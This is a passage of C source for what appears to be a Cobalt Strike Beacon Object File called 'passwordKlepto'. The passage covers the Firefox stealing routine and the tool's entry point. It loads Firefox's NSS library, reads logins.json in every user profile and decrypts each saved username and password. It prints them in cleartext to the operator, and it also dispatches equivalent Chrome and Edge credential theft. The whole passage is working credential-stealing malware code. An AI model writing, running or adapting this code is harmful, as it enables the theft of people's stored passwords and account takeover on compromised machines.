    if (n->NSS_Init(profile) != 0) { BeaconPrintf(CALLBACK_ERROR, "[!] NSS_Init(\"%s\") failed", profile); dbglog("FX NSS_Init FAIL"); return; }
    dbglog("FX NSS_Init ok");
    slot = n->PK11_GetInternalKeySlot();
    dbglog("FX GetSlot ret");
    if (!slot) { BeaconPrintf(CALLBACK_ERROR, "[!] PK11_GetInternalKeySlot failed"); n->NSS_Shutdown(); dbglog("FX GetSlot FAIL"); return; }
    dbglog("FX pre Auth");
    n->PK11_Authenticate(slot, FALSE, NULL);
    dbglog("FX Auth done");

    MSVCRT$_snprintf(loginsPath, sizeof(loginsPath), "%s\\logins.json", profile);
    {
        HANDLE h = KERNEL32$CreateFileA(loginsPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h == INVALID_HANDLE_VALUE) { BeaconPrintf(CALLBACK_ERROR, "[!] logins.json not found: %s", loginsPath); n->PK11_FreeSlot(slot); n->NSS_Shutdown(); return; }
        sz = KERNEL32$GetFileSize(h, NULL);
        json = (char *)intAlloc(sz + 1);
        KERNEL32$ReadFile(h, json, sz, &rd, NULL);
        KERNEL32$CloseHandle(h);
        json[sz] = 0;
    }
    dbglog("FX logins.json read");

    /* iterate over every "encryptedPassword" occurrence; for each, look back for
     * the nearest "hostname" and "encryptedUsername". Firefox field order is
     * hostname, httpRealm/formSubmitURL, encryptedUsername, encryptedPassword. */
    cursor = json;
    while (cursor) {
        char *eup, *epw;
        char ubuf[512], pbuf[1024], hbuf[512];
        char *upStart, *pwStart, *hStart; int upLen, pwLen, hLen;
        char *nextCursor;

        eup = MSVCRT$strstr(cursor, "\"encryptedUsername\"");
        epw = MSVCRT$strstr(cursor, "\"encryptedPassword\"");
        if (!eup && !epw) break;
        nextCursor = (epw ? epw : eup) + 1;

        upStart = json_str(cursor, "encryptedUsername", &upLen);
        pwStart = json_str(cursor, "encryptedPassword", &pwLen);
        /* hostname: search backwards from current cursor */
        hStart = NULL; hLen = 0;
        {
            char *back = cursor;
            char *lastHost = NULL;
            while (1) {
                char *hh = MSVCRT$strstr(back, "\"hostname\"");
                if (!hh || (epw && hh > epw)) break;
                lastHost = hh; back = hh + 1;
            }
            if (lastHost) hStart = json_str(lastHost, "hostname", &hLen);
        }

        if (pwStart && pwLen > 0) {
            char *pwCopy; int okP, okU = 0;
            pwCopy = (char *)intAlloc(pwLen + 1); cstrncpy(pwCopy, pwStart, pwLen, pwLen + 1);
            okP = NssDecrypt(n, pwCopy, pbuf, sizeof(pbuf)); intFree(pwCopy);
            if (upStart && upLen > 0) {
                char *upCopy = (char *)intAlloc(upLen + 1); cstrncpy(upCopy, upStart, upLen, upLen + 1);
                okU = NssDecrypt(n, upCopy, ubuf, sizeof(ubuf)); intFree(upCopy);
            } else { ubuf[0] = 0; }
            if (hStart && hLen > 0) cstrncpy(hbuf, hStart, hLen, sizeof(hbuf)); else { hbuf[0] = 0; }
            (*count)++;
            if (okP) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] %s | %s | %s", hbuf, okU ? ubuf : "<nss user decrypt failed>", pbuf);
                (*dec)++;
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] %s | %s | <nss password decrypt failed>", hbuf, okU ? ubuf : "?");
            }
        }
        cursor = nextCursor;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "===== firefox @ %s done: %d login(s) scanned, %d decrypted =====", profA, *count, *dec);
    intFree(json);
    n->PK11_FreeSlot(slot);
    n->NSS_Shutdown();
}

typedef struct { NssApi *n; int foundAny; } FxEnumCtx;

static void firefox_user_cb(const char *profA, void *ctx) {
    FxEnumCtx *e = (FxEnumCtx *)ctx;
    char roamingBase[MAX_PATH], profile[MAX_PATH];
    int count = 0, dec = 0;
    MSVCRT$_snprintf(roamingBase, sizeof(roamingBase), "%s\\AppData\\Roaming", profA);
    if (!FindFirefoxProfile(roamingBase, profile, sizeof(profile))) return;  /* no Firefox for this user — skip */
    e->foundAny = 1;
    dbglog("FX profile found");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Firefox profile @ %s : %s", profA, profile);
    dbglog("FX pre ProcessOne");
    ProcessOneFirefoxProfile(e->n, profile, profA, &count, &dec);
    dbglog("FX post ProcessOne");
}

static void ProcessFirefox(DWORD unused) {
    char fxDir[MAX_PATH];
    wchar_t fxDirW[MAX_PATH];
    HMODULE hNss = NULL;
    NssApi n; FxEnumCtx ec;
    (void)unused;

    MSVCRT$memset(&n, 0, sizeof(n));
    if (!ResolveFirefoxDir(fxDir, sizeof(fxDir))) { BeaconPrintf(CALLBACK_ERROR, "[!] Firefox install dir not found (registry + Program Files fallback)"); return; }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Firefox install dir: %s", fxDir);

    KERNEL32$MultiByteToWideChar(CP_ACP, 0, fxDir, -1, fxDirW, sizeof(fxDirW) / sizeof(wchar_t));
    KERNEL32$SetDllDirectoryW(fxDirW);
    hNss = KERNEL32$LoadLibraryExW(L"nss3.dll", NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
    KERNEL32$SetDllDirectoryW(NULL);
    if (!hNss) { BeaconPrintf(CALLBACK_ERROR, "[!] LoadLibrary nss3.dll failed (%lu)", KERNEL32$GetLastError()); return; }
    dbglog("FX nss3 loaded");

    n.NSS_Init               = (PFN_NSS_Init)              KERNEL32$GetProcAddress(hNss, "NSS_Init");
    n.NSS_Shutdown           = (PFN_NSS_Shutdown)          KERNEL32$GetProcAddress(hNss, "NSS_Shutdown");
    n.PK11_GetInternalKeySlot= (PFN_PK11_GetInternalKeySlot)KERNEL32$GetProcAddress(hNss, "PK11_GetInternalKeySlot");
    n.PK11_FreeSlot          = (PFN_PK11_FreeSlot)         KERNEL32$GetProcAddress(hNss, "PK11_FreeSlot");
    n.PK11_Authenticate      = (PFN_PK11_Authenticate)    KERNEL32$GetProcAddress(hNss, "PK11_Authenticate");
    n.PK11SDRDecrypt         = (PFN_PK11SDRDecrypt)        KERNEL32$GetProcAddress(hNss, "PK11SDR_Decrypt");
    n.SECITEM_FreeItem       = (PFN_SECITEM_FreeItem)      KERNEL32$GetProcAddress(hNss, "SECITEM_FreeItem");

    if (!n.NSS_Init || !n.PK11_GetInternalKeySlot || !n.PK11_Authenticate || !n.PK11SDRDecrypt) {
        BeaconPrintf(CALLBACK_ERROR, "[!] nss3.dll missing required exports"); KERNEL32$FreeLibrary(hNss); return;
    }
    dbglog("FX exports resolved");

    ec.n = &n; ec.foundAny = 0;
    dbglog("FX enum begin");
    ForEachUserProfile(firefox_user_cb, &ec);
    dbglog("FX enum done");
    if (!ec.foundAny) BeaconPrintf(CALLBACK_OUTPUT, "[*] firefox: no profile found on any user");

    KERNEL32$FreeLibrary(hNss);
}

/* ----------------------------------------------------------------------
 *  entry
 * -------------------------------------------------------------------- */
void go(char *args, int alen) {
    datap parser;
    char *browser, *profileOverride;
    int browserPid, doV20, doFirefox, scanMode;
    char chromeUD[MAX_PATH], edgeUD[MAX_PATH];

    BeaconDataParse(&parser, args, alen);
    browser        = BeaconDataExtract(&parser, NULL);
    profileOverride = BeaconDataExtract(&parser, NULL);
    browserPid     = BeaconDataInt(&parser);
    doV20          = BeaconDataInt(&parser);
    doFirefox      = BeaconDataInt(&parser);
    scanMode       = BeaconDataInt(&parser);
    (void)profileOverride;   /* reserved for a future custom-profile-path mode */

    MSVCRT$_snprintf(chromeUD, sizeof(chromeUD), "\\Google\\Chrome\\User Data");
    MSVCRT$_snprintf(edgeUD,   sizeof(edgeUD),   "\\Microsoft\\Edge\\User Data");

    BeaconPrintf(CALLBACK_OUTPUT, "[*] passwordKlepto: browser='%s' pid=%lu v20=%d ff=%d scan=%d",
                 browser ? browser : "(all)", (unsigned long)browserPid, doV20, doFirefox, scanMode);

    if (browser && MSVCRT$strlen(browser) > 0) {
        if (MSVCRT$strcmp(browser, "firefox") == 0) {
            ProcessFirefox(0);
            return;
        }
        if (MSVCRT$strcmp(browser, "chrome") == 0) { ProcessChromium("chrome", chromeUD, browserPid, doV20, scanMode); return; }
        if (MSVCRT$strcmp(browser, "msedge") == 0) { ProcessChromium("msedge", edgeUD,   browserPid, doV20, scanMode); return; }
        BeaconPrintf(CALLBACK_ERROR, "[!] unknown browser '%s' (use chrome|msedge|firefox)", browser);
        return;
    }

    /* no browser specified -> all three (scan applies to chromium only) */
    ProcessChromium("chrome", chromeUD, browserPid, doV20, scanMode);
    ProcessChromium("msedge", edgeUD,   browserPid, doV20, scanMode);
    if (doFirefox) ProcessFirefox(0);
}